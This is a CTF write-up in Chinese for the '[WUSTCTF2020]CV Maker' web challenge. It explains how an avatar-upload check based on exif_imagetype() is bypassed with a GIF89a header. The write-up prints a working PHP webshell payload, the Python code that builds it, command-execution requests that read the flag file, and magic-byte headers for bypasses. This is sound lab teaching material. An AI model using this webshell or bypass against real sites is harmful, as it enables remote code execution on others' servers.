---
title: "[WUSTCTF2020]CV Maker"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [file-upload, image-bypass, webshell, rce]
vulnerability: 文件上传漏洞，使用 exif_imagetype() 检测但可被 GIF 文件头绕过
solved: true
flag: "flag{1ee12239-94ad-4298-a2c3-f00a58416408}"
---

# [WUSTCTF2020]CV Maker

## 题目概述
一个 CV Maker 简历制作网站，提供用户注册、登录功能，登录后可以上传头像图片。

## 信息收集
1. 访问题目主页，发现有注册和登录表单
2. 注册账户后登录，页面跳转到 `/profile.php`
3. Profile 页面有文件上传功能（更换头像）
4. 尝试上传普通文件，返回 `exif_imagetype not image!` 错误
5. 错误信息泄露：服务器使用 `exif_imagetype()` 函数检测文件类型

## 漏洞分析（漏洞类型、原理、判断过程）

**漏洞类型**：文件上传漏洞 + 图片类型检测绕过

**原理**：
- 服务器使用 `exif_imagetype()` 函数检测上传文件是否为图片
- 该函数通过读取文件头判断图片类型（GIF 文件头为 `GIF89a`）
- 服务器只检测文件头，不检测完整文件内容
- 上传后的文件保留原始扩展名（如 `.php`），服务器会执行其中的 PHP 代码

**判断过程**：
1. 上传普通 PHP 文件 → 报错 `exif_imagetype not image!`
2. 在 PHP 代码前添加 GIF 文件头 `GIF89a` → 上传成功
3. 文件保存为 `.php` 扩展名 → PHP 代码被执行

## 利用过程（Payload + Flag）

**Step 1: 构造图片马**
```
文件内容: GIF89a<?php system($_GET["cmd"]); ?>
文件名: shell.php
```

**Step 2: 上传并执行**
```python
# GIF 文件头绕过图片检测
gif_header = b'GIF89a'
php_code = b'<?php system($_GET["cmd"]); ?>'
payload = gif_header + php_code

# 上传文件，保存为 d41d8cd98f00b204e9800998ecf8427e.php
```

**Step 3: 执行命令获取 Flag**
```bash
# 访问上传的 webshell
GET /uploads/d41d8cd98f00b204e9800998ecf8427e.php?cmd=ls+-la+/

# 发现 flag 文件
/Flag_aqi2282u922oiji

# 读取 flag
GET /uploads/d41d8cd98f00b204e9800998ecf8427e.php?cmd=cat+/Flag_aqi2282u922oiji

# Flag: flag{1ee12239-94ad-4298-a2c3-f00a58416408}
```

## 复现步骤
1. 注册账户并登录
2. 构造 Payload：`GIF89a<?php system($_GET["cmd"]); ?>`
3. 上传文件，文件名使用 `.php` 扩展名
4. 访问上传的 PHP 文件，通过 `cmd` 参数执行系统命令
5. 找到并读取 flag 文件

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| 文件上传 | 头像上传功能 | `GIF89a` + PHP代码 | exif_imagetype() 只检测文件头 |
| RCE | 上传的 .php 文件 | `?cmd=cat /flag` | Apache 执行 .php 文件 |

## 知识总结（解题技巧、同类题型套路）

**解题技巧**：
- 遇到 `exif_imagetype()` 检测，使用对应图片格式文件头绕过
- GIF: `GIF89a` 或 `GIF87a`
- PNG: `\x89PNG\r\n\x1a\n`
- JPG: `\xff\xd8\xff`

**同类题型套路**：
1. 文件上传题先尝试上传各种类型文件，观察过滤机制
2. 常见检测方式：MIME 类型、文件扩展名、文件头（exif_imagetype/getimagesize）
3. 文件头检测绕过：在恶意代码前添加合法图片文件头
4. 上传成功后确认文件扩展名是否保留，是否可被执行
